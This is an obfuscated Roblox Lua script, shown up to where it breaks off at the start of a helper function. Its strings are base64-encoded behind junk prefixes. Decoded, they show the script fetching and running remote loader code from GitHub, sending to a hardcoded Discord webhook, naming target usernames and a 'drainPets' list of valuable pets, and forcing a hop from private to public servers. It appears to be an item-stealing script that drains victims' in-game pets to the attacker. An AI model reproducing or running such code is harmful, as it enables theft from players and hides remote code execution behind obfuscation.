local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('fbNUSqSuMcrSGBRPFpRGhbOUZbtoGZRMFdFZzCkQjgMEPUiNHFWIYStaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('gDoAdlAbyLCpCLFvCNebhhSPiQTgOqsJDBdTVAbOWLcwZfmcpzgNrJbaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('KxpeXZvFMtOuYklfkpfRECofeFqHUQhaNLqbGvwAUFfmeqqZizLIBmgQmFkUGxheWVyMTIz'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('jPIPXZZTaVpysTVzCrKBGLJCzUSwrAJwZmzofrLXyOteXTYZxwSZxuzTXlBbHQ='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('GZVuJURLvmDrWpxAldPZNUlttZrknpBixzRbwmAOVLpsKNRBqtsyTWERW5lbXlHdXk='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('kTFXzywbUexefxmpSQhXpedMziXqSmPfzLXkssVnbITwNElBpMogwQdaW50ZXJjZXB0ZXJudW1iZXIx')}
local drainPets = {
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('cVKUwGwbEHcYUXxcrBaxJBnApEhYBmZlCNTFKImcIyBLxPzkosKhCTwRHJhZ29uZmx5'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('TlAijXfxnawNpyjeGiKTAvZDYIeWFvxPcuxJpWOpwtLYitadDOAsBUMVOKAkVJleA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('mduPSnVEmmNpCZVpCtvqGZvYMHIMQHaqdZPOalqvkwKuClwJMMegqAGUmFjY29vbg=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('tWWjEXBJMPUuLwxOnZMhLEAfCvnHxYoBprbTJLlejBoPufrTgxyRnFNUmVkIEZveA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('LuRlsaCOneDiyazfPQpneKpBroYTQOJaoOXoxDYRNreKshQgrmOkHBlUXVlZW4gQmVl'),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('eLhUnNVUBucMECVLUTsnptneeIyYgAMZvrAjoOeYslSDgygMBsepGNzRGlzY28gQmVl'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('GcpRArQeNaNzduIQoJjMROSFEnCQycdQGOnYJTjiuTHUJFTxHTOUuIxQnV0dGVyZmx5'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('iWoeEATuNgbOnkyoZxkMugbKHabXIjWPkmHmKPdRQVxQzyvFxTLEvvhTWltaWM='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('tmxvrLVgDDUloBRLmoAqqiyobwrgJodJEIqxonmNhyvsgZZnOAGDqeLTW9vbiBDYXQ='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('RWVsMuySRErtdXipCrpFJLtMXYNudMxgKFTLDqHQUcgiKoEcWcBdusVRmVubmVjIEZveA=='),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('aHrlOvnveYIWGCiGpKttPsQjMbFxnNYpypqwGhIGwPoyGIBNPiOwLaZVHJpY2VyYXRvcHM='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('YcFWNgCltMkAYlHPeQUyfcnHQQpEMiJrExnbKOnMghwBVLBKuWGyXiIQXhvbG90bA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('VBZtgwAvdnfZkaBIzWNPqPsRxvxuZTfJVNPzqAonFGiWHzKhXEBweQpQmVhciBCZWU='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('mZIdwpqxcILRRlATZCLgKBGvEReIntzFqQAKJQHOyfBzALHhqIpBShqUG9sYXIgQmVhcg=='),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('AwJcsptzOktLdaaeFJecRvqPmEfkwExWYXTkjeVvLzzAPWhBDhTnvujUHJheWluZyBNYW50aXM='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('NImbqsrCFNxbhIjpycjOEXeCFwyynvnuiKtCLNVbivqaUcykdRZLxAHU2NhcmxldCBNYWNhdw==')
}
local petKeywords = {
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('cxsxtSLOeYMKTGQITVGLzkiCfZMPXnJaJQAIRBbMqxgpBSwTKfisGvaU3RhcmZpc2g='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('lYfkqrNUyFMqSHKbqwLkgqBclNdxMOQVzEVrdhYqhPapYqraQmwUcTEQ3JhYg=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('oseSkyyrrWXzQQhuFNruYcFxharxyXngGSzsdCqJGuvfrVbQaiTXFKXU2VhZ3VsbA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('SPNcpJwHWXrZtoJhzrOPUvphRSYsqKbKpjjdgOCbdOyAOEQMnHxvuVSQnVubnk='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('TTANGxOeEbPsjJineNInHqnrUaBtWMSLJgvpimURtGTHNRfBmmvRqYKRG9n'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('tbfEboNmNerRbiYQzicvxHMIQunayluNCYtpPPmwSIogsrDbsENNYLoR29sZGVuIExhYg=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('kWaYEJOVdgNkfKtUNzNkxstOrfdQsqhxaTSnINJPrHeKyftBxlhKHfIQmVl'),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('sTtLjuSoItTQcXwsOqIwEjkOgyJyBGBbWTcyajLfgSQuGlIgimihuZyQmxhY2sgQnVubnk='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('yXmSwzrzKkQXMvNytMqaGKoCKACrHMloEwlNoaEegXBhgxuDckbgEwdQ2F0'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('iQHaXCxBUuAFAdErJqfIsjSnarrPHNdIMWyDbfIbRPPysFEZytACHLMQ2hpY2tlbg=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('fmVJbjupDTSlDaFAwYwpYLIpSGDrfvJyoARzmbhyXCyEWcstgOcJzGLRGVlcg=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('TgdGsRmZzVueFqqFOKTpOAWgwEzHWoIYqGwotLLPSmmyTmsEBtCZcmqTW9ua2V5'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('geSfiSxxtHxZHzOlmmYjDxKnQAVEAOVmHwfFywNSvNAInxPLJIzjoNFT3JhbmdlIFRhYmJ5'),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('IZPCpOlTNvxpEiJvPmoHcZETKEkCHoVPUgBqeEhuJmWztiQTjCZBQoVUGln'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('UbkdXwjgrdmDcFJNWLGVcXvoHqcrEGLBzRXkZFRrMCsspoItHYMIbNJUm9vc3Rlcg=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('MHObxqeVcLEbKaDvNNdtmVGAzomuYgGVpRrBcreXBEsrYEQXUhirhWtU3BvdHRlZCBEZWVy'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('zEcpOTiXfXTjCkVWKcLuJHCOrxIxFlOXORSfwqNJOHRfNKkbiUODBGRRmxhbWluZ28='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('sExGWglBtrFQIbxAeEerOUpVMaDFwMqkeIAfmAbtIuIAhHIcBFaroxwVG91Y2Fu'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('mWSHPyLxEbNjyZKEudqOoqFZjUrztWDZdIPavsMSIGfqFlCdqApCrWVU2VhIFR1cnRsZQ=='),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('GOZnwBGihmZVKuqAeVtKgCoJcaZoyLaMumcbcjPvgShVeHZgMsDRsbeT3Jhbmd1dGFu'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('lHpHUdyEfBgWcMQMhzEiMNpQOrbwBOqBxjdIlOOcmnIuvjocxWEAUsHU2VhbA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('QMlBiQzniryoCQUfaXqMEvPBJCHrxIoFcfhlDBZnxDcecwYsfkwHIIcSG9uZXkgQmVl'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('PgLBVuNUjHkmJHPKskFZurNNbGGUojhEuzPHJhdndRwQoiSQYemPnaYV2FzcA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('hEwRzpkDVOFRahQjoBbTJSlcECJtkCZFdXeTAXKJdsNzftfwpcBemBWVGFyYW50dWxhIEhhd2s='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('GPCpaiBMxfxTIwGjopPOXElJnBnBzKRfOKwyKnBZDibeXltaatNJOUPUmFwdG9y'),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('idxqusvrEUgYGQktYHQwHRoRHIWqmrGhlcvDuRkdExkqDbwVizPGansVHJpY2VyYXRvcHM='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('UcLCBFTTUkjmiavgkzHpiyJJjKCkCNrmufoVNcbdNoDSIEylPlfXGODU3RlZ29zYXVydXM='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('IYazUgUCTcedciGUQZQcWSIWEbJcozUxvcXJZDwjvDWIPgmfFeaOyajUHRlcm9kYWN0eWw='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('FAqbhHgslLwXMRTDXVgTAUwrJvyCqWtvfFfwUuJBjPkOYPExyfARvHyVHVydGxl'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('cbRooomkNcEwCpoKSxGlYmwBBOSaTOZUonyjcMGrLBkVbpwuxUIPfDBQ2F0ZXJwaWxsYXI='),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('pXdOKNelNpdvEhUwZdahsaWEcyDOVcezOobouBTkYtCwdVWTzGRDDkSUGV0YWwgQmVl'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('ViAiHLyPjEAzzXWLBlXTLxqtrbMhXNNVyjCqyCfhGfsSAQdHkFkJaLvTW90aA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('MfrVXcatvrUhxQiFmLpftBesiSYfGlpjlQbBZmPWfWpFzSXOiKWLOwyU2NhcmxldCBNYWNhdw=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('pNIlEyKJszyVsAKSTzKXANaISrcamynyCiOEWAIvrzDJjaXwfjEGgBGT3N0cmljaA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('JEtnbNSAjBAvuMXgAVMYntAcyYWYXjHVEkGvMUuHBzluUdFdFOLgRuNUGVhY29jaw=='),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('icmsplGVGSBASUcBLejMSGdyvdbqAhzoryrvrBhNyeYurlAbSEeAUTcQ2FweWJhcmE='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('gcKWHOevPITlJTlVzNVjLuzTxoXDgGnuEyKAyDChigrYdNuUEEZtEVoU2FuZCBTbmFrZQ=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('GlJfLCLNJxEmjmcdhZqSptJIHkyyLcSqewgIircfSeSRuaxMZzcEekeTWVlcmthdA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('HEiLlKLDRdsTLHULitlqhJQEYWHQfUyObtRxnJejbaZZZOvdfkogvBjQnJvd24gTW91c2U='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('HHRmqQXmFMufSdRpGmByGkuUqDjDlXsIKdyBnSsgYSgRZtWtfFWAXVxR2lhbnQgQW50'),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('FypRETfnyYWRwulaPBuiPKIoKRiUXarUrNHgBOSOgsoykpXKJhtoUKJR3JleSBNb3VzZQ=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('mEpSZmKtAAdRSsdpsbuiDsdPKQELPlWrUdqgnLHnXuVcpQnXVYkeiqnUHJheWluZyBNYW50aXM='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('eEpqRGSFZqqwHAxelYyqjhZrztgsfxnaJKPphTaGmIARGSvOzfeqkGMUmVkIEdpYW50IEFudA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('XcctKglcKHQFEGePzTbBZHWviNQQnkMKhnztPxEqhrmdaAFRqHrRqEVU25haWw='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('iDMwfNWqxYZsASLgUjauzjtDWGXkYMFjnEKfoPQSPggbtFGkQjWUwvuU3F1aXJyZWw='),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('chpmMtGxwuJGeFtqxyPIxkFTBKhurweyNIAHmiwdkLROxBsIgEATeqwQmVhciBCZWU='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('HDvWAPdQxmauUHJqAUPbacziJKYnHnysQnAVlceFobXutChdjFWtZNUQnV0dGVyZmx5'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('RMZPWCZeLylVoXSZUmRLQSztbOPxTswagTIzvJogeIfGTAmXRZlnJJIQnJvbnRvc2F1cnVz'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('qXMceZiTDrSzWeZeZNKHIRGcCcnyLQNAvsUqpHZHGDaWHliFSvhnbhuUGFjayBCZWU='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('pydKlcpuPkRqnBAAzlwqzNApSJIMzXxZtFwTZzUrJoHQYqYgJzikEkzTWltaWMgT2N0b3B1cw=='),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('THTcKvPsjMjisNsfjDmoVcAgbXLYQbKjiJBEnSIKBBLbdPWgeJRXPUySHlhY2ludGggTWFjYXc='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('VWsYtQGzgUxuGNAybMcbyXGXGixsQlrROrNRPKKOneAzssYnJzgVxhbQXhvbG90bA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('DGYHLARmeilpaBjpcAepUusbfutzlUuHNQowvXVSwokAUZPUutwfypoUmVkIEZveA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('OgzuUaSmBcfGJfMdPmvcFnIqZgoiaHEPTTKfpIXpFwoEcFFqYptHiVeVOKAkVJleA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('wYbODNeVfvvaOlofUclvOWUMHtjYtONWnuGSDlivBZFiXAwjGqggXLTRHJhZ29uZmx5'),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('rdVsJWPOTTyXPXdZpOtzWeULFZfvdjYlLrLbeTWfnJJyaWgdqdJpuxGUXVlZW4gQmVl'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('iJWtviDZRlGLiZmXuRONAyaATZEeZquUzCBynemiNudgnEkzlWzXKtWRGlzY28gQmVl'), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('YjslAHxWicVzemnWgFXiXNftJJicsFLNRqyNHpjYrzFOhkzRTBxtazpRmVubmVjIEZveA=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('ujZpQbfMQxHfAUFsidPcsSoZNynKlYqfgCAUNmijjtxWlvcjcbzmglLTW9vbiBDYXQ='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('GVyKAcsAykSwSOFOKwVLbMMFQWxkhLxdtKNooCIrhHcDzvHJcqPFooNUmFjY29vbg=='),
    pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('OkyTOUAgNLlitWEycATURtcOWwTcliTOrZXNyKsCTarGLMyibELhWcWUG9sYXIgQmVhcg==')
}

-- SERVICES
local Players = game:GetService(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('teRUkuwUwJVtOLmvHjFifxgiCpdUjzuZtJRRWkcWnjMwLtbWMbXBuMzUGxheWVycw=='))
local ReplicatedStorage = game:GetService(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('huikeGrKRbDpLRxHReVxFpkBpgRezzPwHZemUUJQxCRcNQVwOSgOVLSUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('ipgTzBLFIIUzDSQcRnYunGPZQFfyrEPUqqPrnJqeuJsSilmswarsLOkSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('nUkviwRIomBpoRJFXmdvznuSlMiQeHlAFxBskViSWkUEXvlGGTxLwQKVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('hQOuhQRntsLSTXcWkbXEtxWMEvFVDYwlmAuNulXnlDxlKjqcUtNEwzbTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('mCRGjlKblSRxLmKhVlynZGUWDnzTlPGPsOEALtaCZARJyFSjfKNdIHXQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('HsMYOUieYvAOcwojhfPfkEQxhADlUKmZZlBogDbBDfxNbrBMGMtDmiY')
    local lowest = nil
    repeat
        local url = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('kpUZmCdzJhfcVVocHkSSUEQauxySsibBxlLTncewJFDDhgfmMomLsdvaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('UiVBgjRjMVGrNiBezgiGNDmaDfHLxnppjISZMTIDqtLqHiLnnXQldtZL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('SWjGjUilKulwnxkOoRJRMOdzyPsXAOISyJgVtYQkWDXSrgozEcfjNTi') then url = url .. pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('rhiaPKNEQenngyQJRHTPAHpjKVhCgwmXSTQAbeKzWpUpgugSwqmXUMzJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('bmqWyZBaWfmzGPESLOxBNItbuTLuYQpRELegGVJKHXQjibwqQFiimLoR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('bQrZChugbqmTVpRrItXcJxtcriUqUuiwzwdszlZcBBjaSYNIyBFMRHN') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('hDqXyHqDQzHhlTgqovojQMlotHbNtCtwymqJVUrGpggIwNqKekPzYTuWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('tjadfivcWAbjRfqerACgfoSLUEflOjyBloSiaEITDQnMeVSrQYLxLyNWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
